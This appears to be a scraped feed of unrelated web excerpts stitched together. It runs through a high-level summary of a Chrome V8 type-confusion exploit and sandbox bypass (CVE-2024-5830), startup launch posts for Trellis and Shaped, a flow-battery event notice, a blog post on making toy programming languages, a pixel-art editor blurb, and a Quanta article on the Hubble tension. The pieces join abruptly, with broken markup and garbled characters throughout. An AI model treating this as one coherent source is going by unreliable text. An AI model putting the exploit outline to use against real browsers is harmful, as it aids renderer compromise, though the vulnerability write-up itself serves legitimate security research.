<p>In this post, I‚Äôve looked at <a href="https://github.com/advisories/GHSA-fchp-8m28-g68f">CVE-2024-5830</a>, a confusion between fast and dictionary objects caused by updating of a deprecated map. Map transition and deprecation often introduces complex and subtle problems and has also led to issues that were <a href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2020/CVE-2020-16009.html">exploited in the wild</a>. In this case, updating a deprecated map causes it to become a dictionary map unexpectedly, and in particular, the resulting dictionary map is used by code that assumes the input to be a fast map. This allows me to overwrite an internal property of the dictionary map and eventually cause an OOB access to the dictionary. I can then use this OOB access to create a fake object, leading to arbitrary read and write of the v8 heap.</p>
<p>To bypass the v8 heap sandbox, I modify API objects that are wrappers of Blink objects in v8, causing type confusions in objects outside of the heap sandbox. I then leverage this to achieve arbitrary memory read and write outside of the v8 heap sandbox, and in turn arbitrary code execution in the Chrome renderer process.</p>

We‚Äôre building AI-powered ETL for unstructured data. Trellis transforms phone calls, PDFs, and chats into structured SQL format based on any schema you define in natural language. This helps data and ops teams automate manual data entry and run SQL queries on messy data.</p><p>There‚Äôs a demo video at <a href="https://www.youtube.com/watch?v=ib3mRh2tnSo" rel="nofollow">https://www.youtube.com/watch?v=ib3mRh2tnSo</a> and a sandbox to try out (no sign-in required!) at <a href="https://demo.runtrellis.com/">https://demo.runtrellis.com/</a>.  An interesting historical archive of unstructured data we thought it would be interesting to run Trellis on top of are old Enron emails which famously took months to review. We‚Äôve created a showcase demo here: <a href="https://demo.runtrellis.com/showcase/enron-email-analysis">https://demo.runtrellis.com/showcase/enron-email-analysis</a>, with some documentation here: <a href="https://docs.runtrellis.com/docs/example-email-analytics">https://docs.runtrellis.com/docs/example-email-analytics</a>.</p><p>Why we built this: At the Stanford AI lab where we met, we collaborated with many F500 data teams (including Amazon, Meta, and Standard Chartered), and repeatedly saw the same problem: 80% of enterprise data is unstructured, and traditional platforms can‚Äôt handle it. For example, a major commercial bank I work with couldn‚Äôt improve credit risk models because critical data was stuck in PDFs and emails.</p><p>We realized that our research from the AI lab could be turned into a solution with an abstraction layer that works as well for financial underwriting as it does for analysis of call center transcripts: an AI-powered ETL that takes in any unstructured data source and turns it into a schematically correct table.</p><p>Some interesting technical challenges we had to tackle along the way: (1) Supporting complex documents out of the box: We use LLM-based map-reduce to handle long documents and vision models for table and layout extraction. (2) Model Routing: We select the best model for each transformation to optimize cost and speed. For instance, in data extraction tasks, we could leverage simpler fine-tuned models that are specialized in returning structured JSONs of financial tables. (3) Data Validation and Schema Guarantees: We ensure accuracy with reference links and anomaly detection.</p><p>After launching Trellis, we‚Äôve seen diverse use cases, especially in legacy industries where PDFs are treated as APIs. For example, financial services companies need to process complex documents like bonds and credit ratings into a structured format, and need to speed up underwriting and enable pass-through loan processing. Customer support and back-office operations need to accelerate onboarding by mapping documents across different schema and ERP systems, and ensure support agents follow SOPs (security questions, compliance disclosures, etc.). And many companies today want data preprocessing in ETL pipelines and data ingestion for RAG.</p><p>We‚Äôd love your feedback!

<blockquote>
<p>Our design will be presented at the Flow4UBattery Event in Eindhoven, Netherlands, on April 8-9, 2024. <a href="https://www.eventbrite.com/e/flow4ubattery-event-pioneering-energy-storage-solutions-tickets-851447120257?aff=oddtdtcreator">You can register here for free</a>, which also includes complimentary lunch (so please make sure you intend to attend if you subscribe). Day 2 of the event will feature a workshop where participants can assemble a flow battery themselves using the design from our kit. Additionally, we‚Äôll be giving away 5 complete kits during the event, each including mystat potentiostats. We‚Äôll also have a fully assembled kit doing cycling so that you can see the fully assembled kit in action!</p>
<p>After this event, we will look into selling these kits online, with all proceeds going towards the development of higher capacity kits with the objective of reaching an open source flow battery stack within the next 2 years. We will also be publishing the full designs and bill of materials online, so that anyone can create their own too!</p>

We're building a semantic recommendation and search platform for marketplaces and content companies.</p><p>There‚Äôs a sandbox at <a href="https://play.shaped.ai/dashboard/home">https://play.shaped.ai/dashboard/home</a> that you can use to explore demo models and evaluate results interactively. And we have a demo video at <a href="https://www.youtube.com/watch?v=toCsUYQnJ_g" rel="nofollow">https://www.youtube.com/watch?v=toCsUYQnJ_g</a>.</p><p>The explosion of online content, driven by both individuals and generative tools, is making it harder than ever for users to sift through the noise and find what's relevant to them. Platforms like Netflix, TikTok, and Meta have set a high bar, proving that personalized experiences are key to cutting through the clutter and engaging users effectively.</p><p>Despite advancements in AI and semantic infrastructure like vector stores, building a truly relevant recommendation or search system is still extremely difficult. It's not just about deploying the latest LLM‚Äîthe difficulties lie in creating the infrastructure to orchestrate the components seamlessly. Consider the challenge of continuously fine-tuning models with fresh data while simultaneously serving real-time personalized recommendations to millions of users. It requires a delicate balancing act of speed, scale, and sophistication.</p><p>Our goal is to empower any technical team to build state-of-the-art recommendation and search systems, regardless of their data infrastructure. Here's how we eliminate the friction:</p><p>Solving Data Challenges: We integrate directly with your data sources‚ÄîSegment, Amplitude, Rudderstack, and more. We handle the complexities of real-time streaming, ETLs, and data quality robustness, so you can get started in minutes.</p><p>Leveraging Cutting-Edge Models ‚Äì we utilize state-of-the-art large-scale language, image, and tabular encoding models. This not only extracts maximum value from your data but also simplifies the process, even with unstructured data.</p><p>Real-time Optimization: Unlike vision or NLP tasks, recommendation system performance hinges on real-time capabilities‚Äîtraining, feature engineering, and serving. We've architected our platform with this at its core.</p><p>We're already helping many companies build relevant recommendations and search for their users. Outdoorsy, for example, uses us to power its RV rental marketplace. E-commerce businesses like DribbleUp and startups like Overlap have seen up to a 40% increase in both conversions and engagement when integrating Shaped.</p><p>A bit about us: Tullie was previously an AI Researcher at FAIR working on multimodal ranking at Meta. He released PyTorchVideo, a widely-used video understanding library, which contains the video understanding models that power systems like IG Reels. Dan led product research at Afterpay and Uber, driven by how behavioral psychology influences user experience.</p><p>We've been heads down building Shaped for quite a while, so this launch feels like a big milestone.

            <description><![CDATA[<p>URL: <a href="https://ntietz.com/blog/you-should-make-a-new-terrible-programming-language/">https://ntietz.com/blog/you-should-make-a-new-terrible-programming-language/</a>, See on <a href="https://news.ycombinator.com/item?id=41235677">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>Every software engineer uses a programming language, usually multiple.
Few of us <em>make</em> programming languages.
This makes sense, because the work we need to get done can typically be done just fine in the languages that exist.
Those already have people making them better.
Let's focus on the task at hand.</p>
<p>But that means that we're missing out on some learning opportunities.
I stumbled into those when I <a href="https://ntietz.com/blog/introducing-hurl/">made a language</a> based on a silly premise: control flow via exceptions and <em>nothing else</em>.
It was done as a joke, but I accidentally learned things along the way.</p>

<p>Every serious woodworker makes some of their own equipment.
Some will make their workbench, maybe sawhorses, perhaps jigs for myriad tools and work setups.
These are things a woodworker can make from wood.
But we don't often have access to the machines we'd need for making <em>all</em> the tools we use:
You'd need a metalworking shop to make portions of chisels and planes, let alone any power tools we use.</p>
<p>As programmers, we're in a different position.
We have near total control over the machine, and we have the capability, in theory, to build everything from scratch<sup><a href="#firmware-sad">1</a></sup>.
Since the tools we use are all software-based, and we write software, we can create all of our own tools, from the operating system on up.</p>
<p>This is a privilege which few fields enjoy.
The closest other one I can think of is that machinists can likely produce a lot of their own tools, too.
Where we assume that CPUs and RAM exist, they can assume that motors and control boards exist.
Then they can build those into the rest of the tool.
And so, like machinists, we're able to get incredibly close to our tools.</p>
<h2 id="what-you-learn-by-making-a-language">What you learn by making a language</h2>
<p>One of the tools we interact with the most is the programming language.
We use one to get any programming work done, and they shape how we think through problems as well.
You use a programming language as a tool of thought even when you're away from the keyboard.
This makes it ripe for learning.
You will learn a <em>lot</em> if you make a new programming language.</p>
<p><strong>You'll learn about grammars and language design.</strong>
Before you can implement a programming language, you'll have to decide what you even want it to <em>be</em>.
Is this an imperative language, or functional, or something else?
Is it object oriented?
Does it have traditional syntax borrowed from another language, or are you doing something new and weird?
These, and many others, are the questions you'll grapple with in designing a language.</p>
<p>In the process, you'll learn about <em>why</em> other languages are designed the way they are.
If you're lucky, you'll learn some of this in the initial design process.
For example, while working on my next language, Lilac, I learned why <a href="https://ntietz.com/blog/researching-why-we-use-semicolons-as-statement-terminators/">semicolons are so common</a> because I tried picking something else.
Discussing it with a friend uncovered a <em>lot</em> of potential drawbacks in other choices!
If you're less lucky, you'll learn those lessons in the implementation phase, and those lessons will really stick.</p>
<p><strong>You'll learn about parsing.</strong>
This is one of the first things you'll run into when you start to implement your language.
You can't do a whole lot else without parsing the language.
To start writing the parser, you'll have to pick what kind of parser to write.
Don't overthink it when you're just starting out.
Although, if you're really interested in parsers, it can be a wonderful topic to dive deep into.</p>
<p><strong>You'll learn about runtime execution.</strong>
Running your code means you have to write the runtime (or the compiler) which means thinking deeply about <em>how</em> it will work at run time.
When an exception is thrown, how does that actually work?
When you reference a variable, how do you know which memory location to find it in?
If you run a recursive function, is there a limit to how far you can recurse? Why is that?
These are some of the questions you'll answer.</p>
<p>The list really goes on, and on, and on.
You can tailor your language to what you want to learn about.
My first language, Hurl, taught me about the basics of making an interpreter, designing a language, and writing a grammar.
My second language, Lilac, is going to teach me more about type systems, runtimes, and instrumentation.</p>
<p>As you go make a language, you'll gain deeper intuitions for and understanding of other languages.
When I implemented Hurl and ran into parsing errors, it would spit out raw token names at me.
This resembled some of the errors I used to see sometimes in my Neovim Rust LSP integration, and it started to make <em>those</em> errors easier to understand.
Each language and implementation decision you make will deepen your understanding of the languages you use, and you'll be a better user for it.</p>
<h2 id="it-will-be-a-bad-language-and-that-s-okay">It will be a bad language, and that's okay</h2>
<p>The nice thing with writing your own language for learning is that it's likely to be a bad one.
It's certainly <em>possible</em> to make <a href="https://gleam.run/">new, good languages</a>, and that's wonderful!
But in my experience, it's best to separate out learning how to do something from doing it exceptionally well.</p>
<p>When you go into it knowing that it's going to be a bad language, it can be very freeing!
Bad doesn't mean that it's <em>not useful to you</em>, because it still can be.
Mostly, it means that it will lack the fit and finish of a "real" language and it will be defective in some way that limits widespread use.
But you can make something that solves a specific problem for you, lets you do Advent of Code puzzles, or earns you nerd cred with your friends.
These are useful things.</p>
<p>Since you aren't going to make the next Python, you can focus on the things that are interesting, compelling, and fruitful for learning.
You can slough off all the things that are tedious but necessary for real-world usage.
Your learning can be targeted and you can keep it fun, so you're more likely to finish the project.
And it's okay to break things arbitrarily, or make wildly ridiculous language choices that just make you smile.
Because hey, it's going to be bad <em>anyway</em>, right?</p>
<h2 id="getting-started-making-languages">Getting started making languages</h2>
<p>It's intimidating to sit down in front of a blank editor and "make a new language."
For a long time, I thought‚Äîeven as Principal Software Engineer‚Äîthat it was some dark art that is beyond my abilities.
That's a load of crock, and <em>all of us</em> programmers can do it.
It gets easier every year to get started, because there are so many resources out there to learn from.</p>
<p>The first thing I'd recommend is implementing someone <em>else's</em> language in a guided fashion.
I followed <a href="https://craftinginterpreters.com/">Crafting Interpreters</a> for this, and it's <em>incredible</em>.
I've also heard good things about <a href="https://interpreterbook.com/">Writing An Interpreter In Go</a> and <a href="https://www.buildyourownlisp.com/">Build Your Own Lisp</a>.
Any of these will give you a taste of how languages work and let someone experienced guide you thorough it.</p>
<p>One thing, though: I've found it is a good idea to choose a <em>different</em> implementation language from what the book uses.
Crafting Interpreters uses Java and C, so I used Rust.
By choosing a different language, you're forced to grapple with the concepts to translate them.
You can't simply retype the code, so you will learn it at a deeper level.</p>
<p>After that, the direction you go is really up to you.
I got started with Hurl by just kind of designing it and throwing things at the wall to see what sticks.
That worked and let me crystallize a lot of the knowledge I got from Crafting Interpreters.
For Lilac, I've read <a href="https://www3.nd.edu/~dthain/compilerbook/">one book</a> so far and have a short list of others to read.
When I asked friends for recommendations, these are a few of the books they recommend for this:</p>
<ul>
<li><a href="https://www3.nd.edu/~dthain/compilerbook/">Introduction to Compilers and Language Design</a>, which I've read and really enjoyed</li>
<li><a href="https://shop.elsevier.com/books/engineering-a-compiler/cooper/978-0-12-815412-0">Engineering a Compiler</a></li>
<li><a href="https://www.plai.org/">Programming Languages: Application and Interpretation</a></li>
<li><a href="https://suif.stanford.edu/dragonbook/">Compilers: Principles, Techniques, and Tools</a> aka the Dragon Book</li>
</ul>
<p>What you read will depend on where you want to go next and what you want to learn.</p>
<h2 id="go-forth-make-something-fun">Go Forth, make something fun</h2>
<p>I think we should all go and make a new language.
It's a great way to learn, and new ideas have to come from somewhere.
At the end of the day, it's a wonderful way to have some fun with your computer.</p>
<p>Oh, and <em>please</em> expand the vocabulary of programming language names.
We can say "Go Forth" but it's hard to put together a whole sentence with just programming languages.
Let's fix that, shall we?
And let's B Swift about it.</p>

<p dir="auto"><em>Stipple Effect</em> is a pixel art editor that supports animation and scripting. It is designed to facilitate a variety of workflows and to encourage rapid, iterative creation of video game art assets and other types of artwork.</p>
<p dir="auto">SE was made by a solo indie game developer with the needs and skill sets of other indie devs in mind. It is lightweight and simple to learn and use, yet allows for considerable depth and complexity. SE has a feature-rich scripting API that can be harnessed for the automation of otherwise tedious and repetitive tasks.</p>

Modern measurements of how fast it is expanding disagree, however, suggesting that our understanding of the laws of physics might be off. Everyone expected the sharp vision of the James Webb Space Telescope to bring the answer into focus. But a long-awaited analysis of the telescope‚Äôs observations released late Monday evening once again gleans conflicting expansion rates from different types of data, while homing in on possible sources of error at the heart of the conflict.</p>
<p>Two rival teams have led the effort to measure the cosmic expansion rate, which is known as the Hubble constant, or H<sub>0</sub>. One of these teams, led by <a href="https://physics-astronomy.jhu.edu/directory/adam-riess/">Adam Riess</a> of Johns Hopkins University, has consistently measured H<sub>0</sub> to be about 8% higher than the theoretical prediction for how fast space should be expanding, based on the cosmos‚Äôs known ingredients and governing equations. This discrepancy, known as the Hubble tension, suggests that the theoretical model of the cosmos might be missing something ‚Äî some extra ingredient or effect that speeds up cosmic expansion. Such an ingredient could be a clue to a more complete understanding of the universe.</p>
<p>Riess and his team released <a href="https://iopscience.iop.org/article/10.3847/2041-8213/ad1ddd">their latest measurement</a> of H<sub>0</sub> based on Webb data this spring, getting a value that agrees with their earlier estimates.</p>
<p>But for years a rival team led by <a href="https://astro.uchicago.edu/people/wendy-l-freedman.php">Wendy Freedman</a> of the University of Chicago has urged caution, arguing that cleaner measurements were needed. Her team‚Äôs own measurements of H<sub>0</sub> have invariably landed closer than Riess‚Äô to the theoretical prediction, implying that the Hubble tension may not be real.</p>
<p>Since the Webb telescope started taking data in 2022, the astrophysics community has awaited Freedman‚Äôs multipronged analysis using the telescope‚Äôs observations of three types of stars. Now, the results are in: Two types of stars yield H<sub>0</sub> estimates that align with the theoretical prediction, while the third ‚Äî the same type of star Riess uses ‚Äî matches his team‚Äôs higher H<sub>0</sub> value.</p>
</div></div><figure><div><p><img alt="" src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/Hubble_Tension-crMarkBelan-Desktop-v2.svg"></p><figcaption><div><p>Mark Belan for <em>Quanta Magazine</em></p></div></figcaption></div><figcaption><div><p>Mark Belan for <em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><p>That the three methods disagree ‚Äúis not telling us about fundamental physics,‚Äù Freedman said. ‚ÄúThat‚Äôs telling us there‚Äôs some systematic [error] in one or more of the distance methods.‚Äù</p>
<p><a href="https://arxiv.org/abs/2408.06153">Freedman‚Äôs results</a> have been submitted to <em>The Astrophysical Journal</em> but have not yet undergone formal peer review, where outside researchers anonymously check the data and analysis. <a href="https://physics.berkeley.edu/people/faculty/saul-perlmutter">Saul Perlmutter</a>, a Nobel Prize-winning cosmologist at the University of California, Berkeley, who was shown the team‚Äôs preprint prior to its release, told <em>Quanta</em> that the results suggest ‚Äúwe may have a Hubble tension just within the [star-based] measurements. That‚Äôs the tension that we really have to be trying to figure out more than trying to invent new [cosmological] models.‚Äù</p>
<p>The results come after months of behind-the-scenes drama, as Freedman initially thought her analysis had killed the Hubble tension, only to see it come roaring back to life. ‚ÄúIt‚Äôs been really ‚Ä¶ not dull, I‚Äôll put it that way,‚Äù she said.</p>
<p>That‚Äôs business as usual. According to Perlmutter, ‚ÄúThe Hubble constant has such a long and glorious tradition of being an impossible decades-long problem.‚Äù</p>
<h2><strong>A Clashing Universe</strong></h2>
<p>The hard part of gauging cosmic expansion is measuring distances to objects in space. The American astronomer Henrietta Leavitt first <a href="https://ui.adsabs.harvard.edu/abs/1912HarCi.173....1L/abstract">uncovered</a> a way to do this in 1912 using pulsating stars called Cepheids. These stars flicker at a rate that relates to (and can therefore reveal) their intrinsic luminosity. Once you know how luminous a Cepheid is, you can compare that to how bright or dim it appears to estimate how far away its galaxy is.</p>
<p>Edwin Hubble used Leavitt‚Äôs method to measure the distances to a handful of galaxies with Cepheids in them, discovering in 1929 that galaxies farther from us are moving away faster. That means the universe is expanding. Hubble pegged the expansion rate at 500 kilometers per second per megaparsec (km/s/Mpc), meaning that two galaxies separated by 1 Mpc, or about 3.2 million light-years, fly apart at 500 km/s.</p>
<p>That was wildly off.</p>
</div></div><figure><div><p><img alt="Black-and-white photo of a man with a pipe looking into the eyepiece of a huge telescope." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/EdwinHubble-1949-coCaltechArchivesAndSpecialCollections-scaled.webp"></p></div><figcaption><div><p>The American astronomer Edwin Hubble, discoverer of cosmic expansion, is pictured in 1949 peering into the Schmidt telescope at the Palomar Observatory near San Diego.</p><p>Courtesy of the Caltech Archives and Special Collections</p></div></figcaption></figure><div><h2>Introduction</h2><div><p>Measurements of H<sub>0</sub> improved as astronomers got better at calibrating the relationship between Cepheids‚Äô pulsation frequency and their luminosity. Still, the whole approach was limited because Cepheids are only so bright. To measure the distance to galaxies across the vastness of the universe, scientists would need a new approach.</p>
<p>In the 1970s, researchers started using Cepheids to calibrate the distances to bright supernovas, enabling more accurate measurements of H<sub>0</sub>. Then as now, two research teams led the way, using supernovas anchored to Cepheids and arriving at disagreeing values of 50 km/s/Mpc and 100 km/s/Mpc. ‚ÄúThere was no meeting of minds ever; they were just completely polarized,‚Äù said <a href="https://people.ast.cam.ac.uk/~gpe/">George Efstathiou</a>, an astrophysicist at the University of Cambridge.</p>
<p>The 1990 launch of the Hubble Space Telescope gave astronomers a new, crisp view of the universe. Freedman led a multiyear observing campaign using Hubble, and in 2001, she and her colleagues <a href="https://iopscience.iop.org/article/10.1086/320638">announced</a> an expansion rate of 72 km/s/Mpc, estimating that this was at most 10% off.</p>

<p>Riess, who is one of the Nobel Prize-winning discoverers of dark energy, jumped into the cosmic expansion game a few years later. In 2011, his team published an H<sub>0</sub> value of 73 with an estimated 3% uncertainty.</p>
<p>Soon after this, cosmologists pioneered another method entirely. In 2013, they used the Planck telescope‚Äôs observations of light left over from the early universe to determine the detailed shape and composition of the primordial cosmos. They then plugged those ingredients into Einstein‚Äôs general theory of relativity and evolved the theoretical model forward nearly 14 billion years to predict the current state of the universe. This extrapolation <a href="https://www.aanda.org/articles/aa/full_html/2020/09/aa33910-18/aa33910-18.html">predicts</a> that the cosmos should currently be expanding at a rate of 67.4 km/s/Mpc, with an uncertainty that‚Äôs less than 1%.</p>
<p>Riess‚Äô team‚Äôs measurement, even as its precision improved, stayed at 73. This higher value implies that galaxies today are flying apart faster than they should be according to theory. The Hubble tension was born. ‚ÄúIf it‚Äôs a real feature of the universe, then it‚Äôs telling us that we‚Äôre missing something in the cosmological model,‚Äù Riess said.</p>
<p>This missing something would be the first new ingredient of the cosmos to be discovered since dark energy. Theorists have <a href="https://www.quantamagazine.org/why-is-the-universe-expanding-so-fast-20200427/">speculated about its identity</a>: Perhaps it is an additional form of repulsive energy that lasted for a brief time in the early universe? Or maybe it‚Äôs <a href="https://www.quantamagazine.org/the-hidden-magnetic-universe-begins-to-come-into-view-20200702/">primordial magnetic fields</a> generated during the Big Bang?</p>
<p>Or maybe the something that‚Äôs missing has more to do with us than the universe.</p>
<h2><strong>Ways of Seeing </strong></h2>
<p>Some cosmologists, including Freedman, have suspected that unrecognized errors are to blame for the discrepancy.</p>
<p>The most common argument in this vein is that Cepheid stars live in the disks of younger galaxies, in regions crowded with stars, dust and gas. ‚ÄúEven with the exquisite resolution of [Hubble], you don‚Äôt see a single Cepheid,‚Äù Efstathiou said, ‚Äúyou see it superimposed with other stars.‚Äù This congestion complicates brightness measurements.</p>
<p>When the house-size Webb telescope launched in December 2021, Riess and his colleagues turned to its powerful infrared camera to pierce the dust in the crowded regions where Cepheids live. They sought to test if crowding has as strong an effect as Freedman and other researchers have claimed.</p>

<p>Their latest results with Webb reaffirm the H<sub>0</sub> value that they <a href="https://iopscience.iop.org/article/10.3847/2041-8213/ac5c5b">measured</a> with Hubble a few years ago: 73.0, give or take 1.0 km/s/Mpc.</p>
<p>Given the crowding concern, though, Freedman had already turned to alternative stars that could serve as distance indicators. These are found in the outskirts of galaxies, far from the madding crowd.</p>
<p>One type is ‚Äútip-of-the-red-giant-branch,‚Äù or TRGB, stars. A red giant is an elderly star with a puffed-up atmosphere that glows brightly in red light. As it ages, a red giant will eventually ignite the helium in its core. At that moment, both the star‚Äôs temperature and its brightness suddenly drop off, said Kristen McQuinn, an astronomer at the Space Telescope Science Institute who led a Webb telescope project to calibrate distance measurements with TRGBs.</p>
<p>A typical galaxy has many red giants. If you plot the brightness of these stars against their temperatures, you‚Äôll see the point at which their brightness drops off. The population of stars right before the drop is a good distance indicator, because in every galaxy, that population will have a similar spread of luminosities. By comparing the observed brightness of these stellar populations, astronomers can estimate relative distances.</p>
<p>(With any method, the physicists must deduce the absolute distance of at least one ‚Äúanchor‚Äù galaxy in order to calibrate the whole scale. For their anchor, Riess, Freedman and other groups use an unusual nearby galaxy whose absolute distance has been <a href="https://arxiv.org/abs/astro-ph/9907013">determined geometrically</a> through a parallax-like effect.)</p>

<p>Using TRGBs as distance indicators is more complex than using Cepheids, however. McQuinn and her colleagues used nine of the Webb telescope‚Äôs wavelength filters to <a href="https://iopscience.iop.org/article/10.3847/1538-4357/ad306d">understand precisely</a> how their brightness depends on their color.</p>
<p>Astronomers are also beginning to turn to a new distance indicator: carbon-rich giant stars that belong to what‚Äôs called the J-region asymptotic giant branch (JAGB). These stars also sit away from a galaxy‚Äôs bright disk and emit a lot of infrared light. The technology to observe them at great distances wasn‚Äôt adequate until the Webb era, said Freedman‚Äôs graduate student Abigail Lee.</p>
<p>Freedman and her team applied for Webb telescope time to observe TRGBs and JAGBs along with the more established distance indicators, the Cepheids, in 11 galaxies. ‚ÄúI am a strong proponent of different methods,‚Äù she said.</p>
<h2><strong>An Evaporating Solution </strong></h2>
<p>On March 13, 2024, Freedman, Lee and the rest of their team sat around a table in Chicago to reveal what they had been hiding from themselves. Over the previous months, they had split into three groups. Each was tasked with measuring the distance to the 11 galaxies in their study using one of three methods: Cepheids, TRGBs or JAGBs. The galaxies also hosted the relevant kinds of supernovas, so their distances could calibrate the distances of supernovas in many more galaxies farther away. How fast these farther galaxies are receding from us (which is easily read off from their color) divided by their distances gives H<sub>0</sub>.</p>
<p>The three groups had calculated their distance measurements with a unique random offset added to the data. When they met in person, they removed each of the offsets and compared the results.</p>
<p>All three methods gave similar distances, within 3% uncertainty. It was ‚Äúsort of jaw-dropping,‚Äù Freedman said. The team calculated three H<sub>0</sub> values, one for each distance indicator. All came within range of the theoretical prediction of 67.4.</p>
<p>At that moment, they appeared to have erased the Hubble tension. But when they dug into the analysis to write up the results, they found problems.</p>
<p>The JAGB analysis was fine, but the other two were off. The team noticed that there were large error bars on the TRGB measurement. They tried to shrink them by including more TGRBs. But when they did so, they found that the distance to the galaxies was smaller than they first thought. The change yielded a larger H<sub>0</sub> value.</p>
<p>In the Cepheid analysis, Freedman‚Äôs team uncovered an error: In about half the Cepheids, the correction for crowding had been applied twice. Fixing that significantly increased the resulting H<sub>0</sub> value. It ‚Äúbrought us more into agreement with Adam [Riess], which ought to make him a little happier,‚Äù Freedman said. The Hubble tension was resurrected.</p>
</div></div><figure><div><p><img alt="A woman with black hair is seated in an armchair in front of a wall-spanning photo of the night sky." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2024/08/WendyFreedman-crNancyWong.webp"></p></div><figcaption><div><p>Wendy Freedman at the University of Chicago is exploring how Webb telescope observations can be squared with the standard cosmological model.</p><p>Nancy Wong</p></div></figcaption></figure><div><h2>Introduction</h2><div><p>But Freedman suspects that the Cepheid-based H<sub>0</sub> measurement is not as trustworthy as the others. It is extremely sensitive to assumptions about, for example, the elemental composition of the Cepheids, and each star‚Äôs neighborhood. Dust in the galactic disks where Cepheids live can absorb their light and dim them. The Webb‚Äôs infrared vision pierces the dust, but astronomers need to know how much dust is absorbing light so they can correct for it. For this, Freedman and her colleagues turned to archival Hubble telescope data, which captures the ‚Äúdust depth,‚Äù but it‚Äôs not as high-resolution as Webb data. That added uncertainties in the calculated distances, she said.</p>
<p>Another issue surfaced. The 11 galaxies they studied with the Webb telescope are the ones nearest to Earth that host all four relevant objects (JAGBs, TRGBs, Cepheids and the relevant type of supernova). But according to Freedman, the galaxies‚Äô supernovas seemed to be intrinsically brighter than the ones in farther galaxies. This is another puzzle cosmologists have yet to understand, and it also affects the H<sub>0</sub> value. ‚ÄúI think this is going to be where we‚Äôre really going to all have to focus our attention on in the next few years,‚Äù she said.</p>
<p>Their paper reports three separate H<sub>0</sub> values. The JAGB measurement ‚Äî the one that was done in a completely blind way, without any subsequent correcting ‚Äî gives 67.96 km/s/Mpc, give or take 1.71 km/s/Mpc. That‚Äôs smack-dab on top of the theoretical prediction, seeming to confirm the standard model of cosmology.</p>
<p>TRGBs yield a value of 69.85 with similar error margins. The result also alleviates the Hubble tension.</p>

<p>The Cepheid method put the value of H<sub>0</sub> higher, at 72.05, but with more subjectivity involved: Different assumptions about the stars‚Äô characteristics caused the value to range from 69 to 73. The high end of the range matches Riess‚Äô measurements; at the low end, the Hubble tension all but goes away.</p>
<p>‚ÄúI don‚Äôt think we can just say that the Hubble constant is&nbsp;73,‚Äù Freedman said. ‚ÄúI think this is the first test of the&nbsp;Cepheid distance scale,‚Äù meaning that JAGBs and TRGBs are serving as a check on the more established method. ‚ÄúAnd we‚Äôre not getting the same answer when we test the Cepheids. So I&nbsp;think it‚Äôs important.‚Äù</p>
<p>Combining the methods and uncertainties yielded an average H<sub>0</sub> value of 69.96 with a 4% uncertainty. That margin of error overlaps with both the theoretical prediction for the cosmic expansion rate and Riess‚Äô team‚Äôs higher value.</p>
<p>‚ÄúWe don‚Äôt yet, I think, have the evidence to&nbsp;unambiguously conclude that there‚Äôs a [Hubble] tension,‚Äù Freedman said. ‚ÄúI just don‚Äôt see it.‚Äù</p>
<p>‚ÄúEverything depends on tracking down all of these systematic errors,‚Äù Perlmutter said.</p>
<h2><strong>Tensions and Resolutions</strong></h2>
<p>The James Webb Space Telescope is also enabling additional ways to measure H<sub>0</sub>. For instance, astronomers are in the early phases of using how mottled a galaxy looks as a proxy for its distance. The idea is simple: Closer galaxies look clumpier because you can resolve some of their stars, whereas more distant galaxies appear smoother. ‚ÄúIt‚Äôs basically a way to turn the crowding into a measure of distance,‚Äù said Anand, who is involved with this project in addition to his work with Riess.</p>

<p>A different method also offers some hope: A massive cluster of galaxies acts like a warped magnifying glass, bending and magnifying the image of an object behind it and creating multiple images of the same object as its light takes multiple paths. The University of Arizona astronomer <a href="https://www.as.arizona.edu/people/faculty/brenda-frye">Brenda Frye</a> leads a program to observe seven clusters with the Webb telescope. When Frye and her colleagues looked at their first telescope image last year, featuring the massive galaxy cluster G165, ‚Äúwe all just said, ‚ÄòWhat are those three dots that weren‚Äôt there before?‚Äô‚Äù she recalled. The dots were three separate images of the same supernova that had exploded behind the cluster.</p>
<p>After repeatedly observing the image, they could calculate the differences between the arrival times of the three lensed supernova images. The time delay is proportional to, and can be used to infer, the Hubble constant. ‚Äú[It] is a one-step measurement for H<sub>0</sub>,‚Äù Frye said, ‚Äúwhich makes it completely independent.‚Äù They <a href="https://arxiv.org/abs/2403.18902">measured</a> an expansion rate of 75.4 km/s/Mpc, although with a large uncertainty of +8.1 or ‚àí5.5 km/s/Mpc. Frye expects to refine those error bars after a few more years of similar measurements.</p>
<p>Both Riess‚Äô and Freedman‚Äôs teams also anticipate that the next few years of JWST observations will enable them to home in on an answer with their traditional, star-based methods.</p>
<p>‚ÄúWith the improvement in the data, this is ultimately going to be solved, and I think pretty quickly,‚Äù Freedman said. ‚ÄúWe‚Äôre going to get to the bottom of this.‚Äù</p>
